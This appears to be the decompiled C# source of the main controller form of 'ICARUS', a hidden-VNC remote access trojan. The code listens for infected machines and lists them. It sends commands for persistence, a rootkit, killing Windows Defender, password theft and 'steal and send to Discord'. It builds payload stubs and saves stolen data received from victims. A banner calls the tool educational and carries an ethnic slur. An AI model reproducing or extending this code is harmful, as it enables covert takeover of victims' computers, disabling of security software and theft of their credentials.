// ICARUS.HVNC.Manager

using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using ICARUS.HVNC.Properties;
using Microsoft.VisualBasic.CompilerServices;

namespace ICARUS.HVNC
{
    public class Manager : Form
    {
        private class BlueRenderer : ToolStripProfessionalRenderer
        {
            protected override void OnRenderMenuItemBackground(ToolStripItemRenderEventArgs toolStripItemRenderEventArgs_0)
            {
                Rectangle rect = new Rectangle(Point.Empty, toolStripItemRenderEventArgs_0.Item.Size);
                using (SolidBrush brush = new SolidBrush(toolStripItemRenderEventArgs_0.Item.Selected ? Color.White : Color.White))
                {
                    toolStripItemRenderEventArgs_0.Graphics.FillRectangle(brush, rect);
                }
                if (!toolStripItemRenderEventArgs_0.Item.Selected)
                {
                    toolStripItemRenderEventArgs_0.Item.ForeColor = Color.Black;
                    base.OnRenderMenuItemBackground(toolStripItemRenderEventArgs_0);
                    return;
                }
                Pen pen = new Pen(Color.SteelBlue);
                SolidBrush solidBrush = new SolidBrush(Color.SteelBlue);
                toolStripItemRenderEventArgs_0.Item.ForeColor = Color.Black;
                Rectangle rect2 = new Rectangle(Point.Empty, toolStripItemRenderEventArgs_0.Item.Size);
                toolStripItemRenderEventArgs_0.Graphics.FillRectangle(solidBrush, rect2);
                toolStripItemRenderEventArgs_0.Graphics.DrawRectangle(pen, 0, 0, rect2.Width, rect2.Height);
                pen.Dispose();
                solidBrush.Dispose();
            }
        }

        private ListViewItem lvHoveredItem;

        public static List<TcpClient> _clientList;

        public static TcpListener _TcpListener;

        private Thread VNC_Thread;

        public static int SelectClient;

        private int int_0;

        private bool bool_1;

        private bool bool_2;

        public MoveBytes MoveBytes0;

        public TGtoDSC TGDC0;

        public static int int_2;

        public static Random random;

        public int count;

        public TGtoDSC ST_0;

        private IContainer components;

        private ColumnHeader columnHeader1;

        private ColumnHeader columnHeader2;

        private ContextMenuStrip contextMenuStrip1;

        private ToolStripMenuItem buildHVNCToolStripMenuItem;

        private ColumnHeader columnHeader3;

        private ColumnHeader columnHeader4;

        private ColumnHeader columnHeader5;

        private ColumnHeader columnHeader6;

        private ColumnHeader columnHeader7;

        private ImageList imageList1;

        private ImageList imageList2;

        private ListView ClientsList;

        private PrimeTheme primeTheme1;

        private StudioButton studioButton5;

        private StudioButton studioButton4;

        private StudioButton studioButton3;

        private StudioButton studioButton1;

        private Label HVNCListen;

        private Label label1;

        private PictureBox pictureBox1;

        private Label label3;

        private Panel panel1;

        private ToolStripMenuItem controlManagementToolStripMenuItem;

        private ToolStripMenuItem miscOptionsToolStripMenuItem;

        private ToolStripMenuItem serverControlToolStripMenuItem;

        private ToolStripMenuItem hVNCPanelToolStripMenuItem;

        private ToolStripMenuItem startupToolStripMenuItem;

        private ToolStripMenuItem taskToolStripMenuItem;

        private ToolStripMenuItem watcherToolStripMenuItem;

        private ToolStripMenuItem rootkitToolStripMenuItem;

        private ToolStripMenuItem uninstallToolStripMenuItem;

        private ToolStripMenuItem restartToolStripMenuItem;

        private ToolStripMenuItem resetSizeToolStripMenuItem;

        private ToolStripMenuItem killWindowsDefenderToolStripMenuItem;

        private JCS.ToggleSwitch chkListen;

        private ToolStripMenuItem passwordsRecoveryToolStripMenuItem;

        private ToolTip toolTip1;
        private Label label2;
        private ToolStripMenuItem stealAndSendToDiscordToolStripMenuItem;

        public string xxhostname { get; set; }

        public string xxip { get; set; }

        public static string Results { get; internal set; }

        private void HVNCList_SelectedIndexChanged(object sender, EventArgs e)
        {
        }

        private void HVNCList_MouseLeave(object sender, EventArgs e)
        {
            if (lvHoveredItem != null && lvHoveredItem != ClientsList.Tag)
            {
                lvHoveredItem.BackColor = Color.FromArgb(54, 74, 104);
            }
            lvHoveredItem = null;
        }

        private void HVNCList_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right || ClientsList.SelectedIndices.Count != 0)
            {
                return;
            }
            foreach (ListViewItem item in ClientsList.Items)
            {
                item.ForeColor = Color.Black;
                item.BackColor = Color.FromArgb(54, 74, 104);
            }
            ClientsList.Tag = null;
        }

        public Manager()
        {
            int_0 = 0;
            bool_1 = true;
            bool_2 = false;
            MoveBytes0 = new MoveBytes();
            InitializeComponent();
        }

        private void Listenning()
        {
            checked
            {
                try
                {
                    _clientList = new List<TcpClient>();
                    _TcpListener = new TcpListener(IPAddress.Any, Convert.ToInt32(Settings.Default.PORT));
                    _TcpListener.Start();
                    _TcpListener.BeginAcceptTcpClient(ResultAsync, _TcpListener);
                }
                catch (Exception ex)
                {
                    try
                    {
                        if (ex.Message.Contains("aborted"))
                        {
                            return;
                        }
                        IEnumerator enumerator = null;
                        while (true)
                        {
                            try
                            {
                                try
                                {
                                    enumerator = Application.OpenForms.GetEnumerator();
                                    while (enumerator.MoveNext())
                                    {
                                        Form form = (Form)enumerator.Current;
                                        if (form.Name.Contains("FrmVNC"))
                                        {
                                            form.Dispose();
                                        }
                                    }
                                }
                                finally
                                {
                                    if (enumerator is IDisposable)
                                    {
                                        (enumerator as IDisposable).Dispose();
                                    }
                                }
                            }
                            catch (Exception)
                            {
                                continue;
                            }
                            break;
                        }
                        bool_1 = false;
                        int num = _clientList.Count - 1;
                        for (int i = 0; i <= num; i++)
                        {
                            _clientList[i].Close();
                        }
                        _clientList = new List<TcpClient>();
                        int_2 = 0;
                        _TcpListener.Stop();
                        Text = "{ ICARUS 1.0.0.3 } - Connections: 0";
                    }
                    catch (Exception)
                    {
                    }
                }
            }
        }

        public static string RandomNumber(int length)
        {
            return new string((from string_0 in Enumerable.Repeat("01234567890", length)
                select string_0[random.Next(string_0.Length)]).ToArray());
        }

        public void ResultAsync(IAsyncResult iasyncResult_0)
        {
            try
            {
                TcpClient tcpClient = ((TcpListener)iasyncResult_0.AsyncState).EndAcceptTcpClient(iasyncResult_0);
                tcpClient.GetStream().BeginRead(new byte[1], 0, 0, ReadResult, tcpClient);
                _TcpListener.BeginAcceptTcpClient(ResultAsync, _TcpListener);
            }
            catch (Exception)
            {
            }
        }

        public void ReadResult(IAsyncResult iasyncResult_0)
        {
            TcpClient tcpClient = (TcpClient)iasyncResult_0.AsyncState;
            checked
            {
                try
                {
                    BinaryFormatter binaryFormatter = new BinaryFormatter();
                    binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
                    binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
                    binaryFormatter.FilterLevel = TypeFilterLevel.Full;
                    byte[] array = new byte[8];
                    int num = 8;
                    int num2 = 0;
                    while (num > 0)
                    {
                        int num3 = tcpClient.GetStream().Read(array, num2, num);
                        num -= num3;
                        num2 += num3;
                    }
                    ulong num4 = BitConverter.ToUInt64(array, 0);
                    int num5 = 0;
                    byte[] array2 = new byte[Convert.ToInt32(decimal.Subtract(new decimal(num4), 1m)) + 1];
                    using (MemoryStream memoryStream = new MemoryStream())
                    {
                        int num6 = 0;
                        int num7 = array2.Length;
                        while (num7 > 0)
                        {
                            num5 = tcpClient.GetStream().Read(array2, num6, num7);
                            num7 -= num5;
                            num6 += num5;
                        }
                        memoryStream.Write(array2, 0, (int)num4);
                        memoryStream.Position = 0L;
                        object objectValue = RuntimeHelpers.GetObjectValue(binaryFormatter.Deserialize(memoryStream));
                        if (objectValue is string)
                        {
                            string[] array3 = (string[])NewLateBinding.LateGet(objectValue, null, "split", new object[1] { "|" }, null, null, null);
                            try
                            {
                                if (Operators.CompareString(array3[0], "54321", TextCompare: false) == 0)
                                {
                                    string text;
                                    try
                                    {
                                        text = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
                                    }
                                    catch
                                    {
                                        text = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
                                    }
                                    ListViewItem lvi = new ListViewItem(new string[7]
                                    {
                                        " " + array3[1].Replace(" ", null) + "88935",
                                        text,
                                        array3[2],
                                        array3[3],
                                        array3[4],
                                        array3[5],
                                        array3[6]
                                    })
                                    {
                                        Tag = tcpClient,
                                        ImageKey = array3[3] + ".png"
                                    };
                                    ClientsList.Invoke((MethodInvoker)delegate
                                    {
                                        lock (_clientList)
                                        {
                                            ClientsList.Items.Add(lvi);
                                            ClientsList.Items[int_2].Selected = true;
                                            _clientList.Add(tcpClient);
                                            int_2++;
                                            Text = "{ ICARUS 1.0.0.3 } - Connections: " + Conversions.ToString(int_2);
                                        }
                                    });
                                }
                                else if (_clientList.Contains(tcpClient))
                                {
                                    GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
                                }
                                else
                                {
                                    tcpClient.Close();
                                }
                            }
                            catch (Exception)
                            {
                            }
                        }
                        else if (_clientList.Contains(tcpClient))
                        {
                            GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
                        }
                        else
                        {
                            tcpClient.Close();
                        }
                        memoryStream.Close();
                        memoryStream.Dispose();
                    }
                    tcpClient.GetStream().BeginRead(new byte[1], 0, 0, ReadResult, tcpClient);
                }
                catch (Exception ex2)
                {
                    if (!ex2.Message.Contains("disposed"))
                    {
                        try
                        {
                            if (_clientList.Contains(tcpClient))
                            {
                                int NumberReceived;
                                for (NumberReceived = Application.OpenForms.Count - 2; NumberReceived >= 0; NumberReceived += -1)
                                {
                                    if (Application.OpenForms[NumberReceived] != null && Application.OpenForms[NumberReceived].Tag == tcpClient)
                                    {
                                        if (Application.OpenForms[NumberReceived].Visible)
                                        {
                                            Invoke((MethodInvoker)delegate
                                            {
                                                if (Application.OpenForms[NumberReceived].IsHandleCreated)
                                                {
                                                    Application.OpenForms[NumberReceived].Close();
                                                }
                                            });
                                        }
                                        else if (Application.OpenForms[NumberReceived].IsHandleCreated)
                                        {
                                            Application.OpenForms[NumberReceived].Close();
                                        }
                                    }
                                }
                                lock (_clientList)
                                {
                                    try
                                    {
                                        int index = _clientList.IndexOf(tcpClient);
                                        _clientList.RemoveAt(index);
                                        ClientsList.Items.RemoveAt(index);
                                        tcpClient.Close();
                                        int_2--;
                                        Text = "{ ICARUS 1.0.0.3 } - Connections: " + Conversions.ToString(int_2);
                                        return;
                                    }
                                    catch (Exception)
                                    {
                                        return;
                                    }
                                }
                            }
                            return;
                        }
                        catch (Exception)
                        {
                            return;
                        }
                    }
                    tcpClient.Close();
                }
            }
        }

        public void GetStatus(object object_2, TcpClient tcpClient_0)
        {
            int hashCode = tcpClient_0.GetHashCode();
            hVNC hVNC2 = (hVNC)Application.OpenForms["VNCForm:" + Conversions.ToString(hashCode)];
            if (object_2 is Bitmap)
            {
                hVNC2.VNCBoxe.Image = (Image)object_2;
            }
            else
            {
                if (!(object_2 is string))
                {
                    return;
                }
                string[] dataReceive = Conversions.ToString(object_2).Split('|');
                string left = dataReceive[0];
                if (Operators.CompareString(left, "0", TextCompare: false) == 0)
                {
                    hVNC2.VNCBoxe.Tag = new Size(Conversions.ToInteger(dataReceive[1]), Conversions.ToInteger(dataReceive[2]));
                }
                if (Operators.CompareString(left, "9", TextCompare: false) != 0)
                {
                    Invoke((MethodInvoker)delegate
                    {
                        try
                        {
                            Clipboard.SetText(dataReceive[1]);
                        }
                        catch (Exception)
                        {
                        }
                    });
                }
                if (!Directory.Exists(Directory.GetCurrentDirectory() + "\\Recovery"))
                {
                    Directory.CreateDirectory("Recovery");
                }
                Results = dataReceive[1];
                if (!Results.Contains("System"))
                {
                    File.WriteAllBytes(Directory.GetCurrentDirectory() + "\\Recovery\\sszQwCZGRo_Recovery.zip", Convert.FromBase64String(Results));
                }
                GC.Collect();
            }
        }

        public static string RandomMutex(int length)
        {
            return new string((from string_0 in Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", length)
                select string_0[random.Next(string_0.Length)]).ToArray());
        }

        private void HVNCList_DoubleClick(object sender, EventArgs e)
        {
            if (ClientsList.FocusedItem.Index == -1)
            {
                return;
            }
            checked
            {
                for (int i = Application.OpenForms.Count - 1; i >= 0; i += -1)
                {
                    if (Application.OpenForms[i].Tag == _clientList[ClientsList.FocusedItem.Index])
                    {
                        Application.OpenForms[i].Show();
                        return;
                    }
                }
                hVNC obj = new hVNC();
                obj.Name = "VNCForm:" + Conversions.ToString(_clientList[ClientsList.FocusedItem.Index].GetHashCode());
                obj.Tag = _clientList[ClientsList.FocusedItem.Index];
                obj.Text = ClientsList.FocusedItem.SubItems[2].ToString().Replace("ListViewSubItem", "{ ICARUS 1.0.0.3 } - Connected to:");
                obj.Show();
            }
        }

        private void HVNCListenBtn_Click_1(object sender, EventArgs e)
        {
        }

        private void buildHVNCToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new StubBuilder(Settings.Default.PORT).ShowDialog();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }

        private void SetLastColumnWidth()
        {
            ClientsList.Columns[ClientsList.Columns.Count - 1].Width = -2;
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            contextMenuStrip1.Renderer = new BlueRenderer();
            SetLastColumnWidth();
            ClientsList.Layout += delegate
            {
                SetLastColumnWidth();
            };
            ClientsList.View = View.Details;
            ClientsList.HideSelection = false;
            ClientsList.OwnerDraw = true;
            ClientsList.GridLines = false;
            ClientsList.BackColor = Color.FromArgb(226, 226, 226);
            ClientsList.DrawColumnHeader += delegate (object sender, DrawListViewColumnHeaderEventArgs e)
            {
                SolidBrush brush = new SolidBrush(Color.White);
                e.Graphics.FillRectangle(brush, e.Bounds);
                TextRenderer.DrawText(e.Graphics, e.Header.Text, e.Font, e.Bounds, Color.Black);
            };
            ClientsList.DrawItem += delegate (object sender, DrawListViewItemEventArgs e)
            {
                e.DrawDefault = true;
            };
            ClientsList.DrawSubItem += delegate (object sender, DrawListViewSubItemEventArgs e)
            {
                e.DrawDefault = true;
            };
            if (Settings.Default.PORT.Length == 0)
            {
                using (Listener listener = new Listener())
                {
                    listener.ShowDialog();
                    return;
                }
            }
            chkListen.Checked = true;
        }

        private void listenning1_TextChanged(object sender, EventArgs e)
        {
        }

        private void HVNCListenPort_TextChanged(object sender, EventArgs e)
        {
        }

        private void studioButton5_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void hVNCPanelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientsList.FocusedItem.Index == -1)
            {
                return;
            }
            checked
            {
                for (int i = Application.OpenForms.Count - 1; i >= 0; i += -1)
                {
                    if (Application.OpenForms[i].Tag == _clientList[ClientsList.FocusedItem.Index])
                    {
                        Application.OpenForms[i].Show();
                        return;
                    }
                }
                hVNC obj = new hVNC();
                obj.Name = "VNCForm:" + Conversions.ToString(_clientList[ClientsList.FocusedItem.Index].GetHashCode());
                obj.Tag = _clientList[ClientsList.FocusedItem.Index];
                obj.Text = ClientsList.FocusedItem.SubItems[2].ToString().Replace("ListViewSubItem", "{ ICARUS 1.0.0.3 } - Connected to:");
                obj.Show();
            }
        }

        private void studioButton4_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Maximized;
        }

        private void studioButton3_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Normal;
        }

        private void studioButton1_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void watcherToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientsList.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select a client first! ", "ICARUS");
                return;
            }
            foreach (object selectedItem in ClientsList.SelectedItems)
            {
                _ = selectedItem;
                count = ClientsList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                object tag = ClientsList.SelectedItems[i].Tag;
                ClientsList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                ClientsList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                SendTCP("1008* ", (TcpClient)tag);
            }
        }

        private void startupToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientsList.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select a client first! ", "ICARUS");
                return;
            }
            foreach (object selectedItem in ClientsList.SelectedItems)
            {
                _ = selectedItem;
                count = ClientsList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                object tag = ClientsList.SelectedItems[i].Tag;
                ClientsList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                ClientsList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                SendTCP("8890* ", (TcpClient)tag);
            }
        }

        private void SendTCP(object object_0, TcpClient tcpClient_1)
        {
            checked
            {
                try
                {
                    lock (tcpClient_1)
                    {
                        BinaryFormatter binaryFormatter = new BinaryFormatter();
                        binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
                        binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
                        binaryFormatter.FilterLevel = TypeFilterLevel.Full;
                        object objectValue = RuntimeHelpers.GetObjectValue(object_0);
                        MemoryStream memoryStream = new MemoryStream();
                        binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
                        ulong num = (ulong)memoryStream.Position;
                        tcpClient_1.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
                        byte[] buffer = memoryStream.GetBuffer();
                        tcpClient_1.GetStream().Write(buffer, 0, (int)num);
                        memoryStream.Close();
                        memoryStream.Dispose();
                    }
                }
                catch (Exception projectError)
                {
                    ProjectData.SetProjectError(projectError);
                    ProjectData.ClearProjectError();
                }
            }
        }

        private void taskToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientsList.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select a client first! ", "ICARUS");
                return;
            }
            foreach (object selectedItem in ClientsList.SelectedItems)
            {
                _ = selectedItem;
                count = ClientsList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                object tag = ClientsList.SelectedItems[i].Tag;
                ClientsList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                ClientsList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                SendTCP("8891* ", (TcpClient)tag);
            }
        }

        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientsList.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select a client first! ", "ICARUS");
                return;
            }
            foreach (object selectedItem in ClientsList.SelectedItems)
            {
                _ = selectedItem;
                count = ClientsList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                object tag = ClientsList.SelectedItems[i].Tag;
                ClientsList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                ClientsList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                SendTCP("8889* ", (TcpClient)tag);
                if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connexion ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
                {
                    SendTCP("24*", (TcpClient)tag);
                    SendTCP("8889* ", (TcpClient)tag);
                    continue;
                }
                break;
            }
        }

        private void rootkitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientsList.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select a client first! ", "ICARUS");
                return;
            }
            foreach (object selectedItem in ClientsList.SelectedItems)
            {
                _ = selectedItem;
                count = ClientsList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                object tag = ClientsList.SelectedItems[i].Tag;
                ClientsList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                ClientsList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                SendTCP("2010* ", (TcpClient)tag);
            }
        }

        private void resetSizeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            hVNC hVNC2 = new hVNC();
            foreach (object selectedItem in ClientsList.SelectedItems)
            {
                _ = selectedItem;
                count = ClientsList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                hVNC2.Name = "VNCForm:" + Conversions.ToString(ClientsList.SelectedItems[i].GetHashCode());
                hVNC2.Tag = ClientsList.SelectedItems[i].Tag;
                hVNC2.ResetScale();
                hVNC2.Dispose();
            }
        }

        private void passwordsRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void killWindowsDefenderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientsList.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select a client first! ", "ICARUS");
                return;
            }
            foreach (object selectedItem in ClientsList.SelectedItems)
            {
                _ = selectedItem;
                count = ClientsList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                object tag = ClientsList.SelectedItems[i].Tag;
                ClientsList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                ClientsList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                SendTCP("2011* ", (TcpClient)tag);
            }
        }

        private void chkListen_CheckedChanged(object sender, EventArgs e)
        {
            checked
            {
                if (HVNCListen.Text.Contains("Disabled"))
                {
                    buildHVNCToolStripMenuItem.Enabled = true;
                    VNC_Thread = new Thread(Listenning)
                    {
                        IsBackground = true
                    };
                    bool_1 = true;
                    VNC_Thread.Start();
                    HVNCListen.Text = "Activated on:" + Settings.Default.PORT + @"    NOTE: NOT FOR COMMERCIALIZATION PURPOSES BY 5$ MORONS(ESPECIALLY ARAB AND INDIAN SCAMMERS)ONLY FOR EDUCATIONAL PURPOSES";
                }
                else
                {
                    if (!HVNCListen.Text.Contains("Activated"))
                    {
                        return;
                    }
                    IEnumerator enumerator = null;
                    while (true)
                    {
                        try
                        {
                            try
                            {
                                enumerator = Application.OpenForms.GetEnumerator();
                                while (enumerator.MoveNext())
                                {
                                    Form form = (Form)enumerator.Current;
                                    if (form.Name.Contains("FrmVNC"))
                                    {
                                        form.Dispose();
                                    }
                                }
                            }
                            finally
                            {
                                if (enumerator is IDisposable)
                                {
                                    (enumerator as IDisposable).Dispose();
                                }
                            }
                        }
                        catch (Exception)
                        {
                            continue;
                        }
                        break;
                    }
                    VNC_Thread.Abort();
                    bool_1 = false;
                    HVNCListen.Text = @"Disabled";
                    buildHVNCToolStripMenuItem.Enabled = false;
                    ClientsList.Items.Clear();
                    _TcpListener.Stop();
                    int num = _clientList.Count - 1;
                    for (int i = 0; i <= num; i++)
                    {
                        _clientList[i].Close();
                    }
                    _clientList = new List<TcpClient>();
                    int_2 = 0;
                    Text = "{ ICARUS 1.0.0.3 } - Connections: 0";
                }
            }
        }

        private void passwordsRecoveryToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (ST_0.IsDisposed)
            {
                ST_0 = new TGtoDSC();
            }
            ST_0.Tag = RuntimeHelpers.GetObjectValue(Tag);
            ST_0.Text = Text.Replace("{ ICARUS 1.0.0.3 - Connected: Admin } - ", null);
            ST_0.Show();
        }

        private void stealAndSendToDiscordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ST_0.IsDisposed)
            {
                ST_0 = new TGtoDSC();
            }
            ST_0.Tag = RuntimeHelpers.GetObjectValue(Tag);
            ST_0.Text = Text.Replace("{ ICARUS 1.0.0.3 - Connected: Admin } - ", null);
            ST_0.Show();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Manager));
            Bloom bloom = new Bloom();
            Bloom bloom2 = new Bloom();
            Bloom bloom3 = new Bloom();
            Bloom bloom4 = new Bloom();
            Bloom bloom5 = new Bloom();
            Bloom bloom6 = new Bloom();
            Bloom bloom7 = new Bloom();
            Bloom bloom8 = new Bloom();
            Bloom bloom9 = new Bloom();
            Bloom bloom10 = new Bloom();
            Bloom bloom11 = new Bloom();
            Bloom bloom12 = new Bloom();
            Bloom bloom13 = new Bloom();
            Bloom bloom14 = new Bloom();
            Bloom bloom15 = new Bloom();
            Bloom bloom16 = new Bloom();
            Bloom bloom17 = new Bloom();
            Bloom bloom18 = new Bloom();
            Bloom bloom19 = new Bloom();
            Bloom bloom20 = new Bloom();
            Bloom bloom21 = new Bloom();
            Bloom bloom22 = new Bloom();
            Bloom bloom23 = new Bloom();
            Bloom bloom24 = new Bloom();
            Bloom bloom25 = new Bloom();
            Bloom bloom26 = new Bloom();
            Bloom bloom27 = new Bloom();
            Bloom bloom28 = new Bloom();
            Bloom bloom29 = new Bloom();
            Bloom bloom30 = new Bloom();
            Bloom bloom31 = new Bloom();
            Bloom bloom32 = new Bloom();
            Bloom bloom33 = new Bloom();
            Bloom bloom34 = new Bloom();
            Bloom bloom35 = new Bloom();
            Bloom bloom36 = new Bloom();
            Bloom bloom37 = new Bloom();
            Bloom bloom38 = new Bloom();
            Bloom bloom39 = new Bloom();
            Bloom bloom40 = new Bloom();
            Bloom bloom41 = new Bloom();
            Bloom bloom42 = new Bloom();
            Bloom bloom43 = new Bloom();
            Bloom bloom44 = new Bloom();
            Bloom bloom45 = new Bloom();
            Bloom bloom46 = new Bloom();
            Bloom bloom47 = new Bloom();
            Bloom bloom48 = new Bloom();
            Bloom bloom49 = new Bloom();
            Bloom bloom50 = new Bloom();
            Bloom bloom51 = new Bloom();
            Bloom bloom52 = new Bloom();
            Bloom bloom53 = new Bloom();
            Bloom bloom54 = new Bloom();
            Bloom bloom55 = new Bloom();
            Bloom bloom56 = new Bloom();
            Bloom bloom57 = new Bloom();
            Bloom bloom58 = new Bloom();
            Bloom bloom59 = new Bloom();
            Bloom bloom60 = new Bloom();
            Bloom bloom61 = new Bloom();
            Bloom bloom62 = new Bloom();
            this.imageList1 = new ImageList(this.components);
            this.contextMenuStrip1 = new ContextMenuStrip(this.components);
            this.controlManagementToolStripMenuItem = new ToolStripMenuItem();
            this.startupToolStripMenuItem = new ToolStripMenuItem();
            this.taskToolStripMenuItem = new ToolStripMenuItem();
            this.miscOptionsToolStripMenuItem = new ToolStripMenuItem();
            this.watcherToolStripMenuItem = new ToolStripMenuItem();
            this.rootkitToolStripMenuItem = new ToolStripMenuItem();
            this.killWindowsDefenderToolStripMenuItem = new ToolStripMenuItem();
            this.passwordsRecoveryToolStripMenuItem = new ToolStripMenuItem();
            this.stealAndSendToDiscordToolStripMenuItem = new ToolStripMenuItem();
            this.serverControlToolStripMenuItem = new ToolStripMenuItem();
            this.uninstallToolStripMenuItem = new ToolStripMenuItem();
            this.restartToolStripMenuItem = new ToolStripMenuItem();
            this.resetSizeToolStripMenuItem = new ToolStripMenuItem();
            this.hVNCPanelToolStripMenuItem = new ToolStripMenuItem();
            this.buildHVNCToolStripMenuItem = new ToolStripMenuItem();
            this.imageList2 = new ImageList(this.components);
            this.primeTheme1 = new PrimeTheme();
            this.label3 = new Label();
            this.pictureBox1 = new PictureBox();
            this.studioButton1 = new StudioButton();
            this.studioButton5 = new StudioButton();
            this.ClientsList = new ListView();
            this.columnHeader1 = new ColumnHeader();
            this.columnHeader2 = new ColumnHeader();
            this.columnHeader3 = new ColumnHeader();
            this.columnHeader4 = new ColumnHeader();
            this.columnHeader5 = new ColumnHeader();
            this.columnHeader6 = new ColumnHeader();
            this.columnHeader7 = new ColumnHeader();
            this.studioButton4 = new StudioButton();
            this.studioButton3 = new StudioButton();
            this.panel1 = new Panel();
            this.chkListen = new JCS.ToggleSwitch();
            this.label1 = new Label();
            this.HVNCListen = new Label();
            this.toolTip1 = new ToolTip(this.components);
            this.contextMenuStrip1.SuspendLayout();
            this.primeTheme1.SuspendLayout();
            ((ISupportInitialize)this.pictureBox1).BeginInit();
            this.panel1.SuspendLayout();
            base.SuspendLayout();
            this.imageList1.ImageStream = (ImageListStreamer)resources.GetObject("imageList1.ImageStream");
            this.imageList1.TransparentColor = Color.Transparent;
            this.imageList1.Images.SetKeyName(0, "ad.png");
            this.imageList1.Images.SetKeyName(1, "ae.png");
            this.imageList1.Images.SetKeyName(2, "af.png");
            this.imageList1.Images.SetKeyName(3, "ag.png");
            this.imageList1.Images.SetKeyName(4, "ai.png");
            this.imageList1.Images.SetKeyName(5, "al.png");
            this.imageList1.Images.SetKeyName(6, "am.png");
            this.imageList1.Images.SetKeyName(7, "an.png");
            this.imageList1.Images.SetKeyName(8, "ao.png");
            this.imageList1.Images.SetKeyName(9, "ar.png");
            this.imageList1.Images.SetKeyName(10, "as.png");
            this.imageList1.Images.SetKeyName(11, "at.png");
            this.imageList1.Images.SetKeyName(12, "au.png");
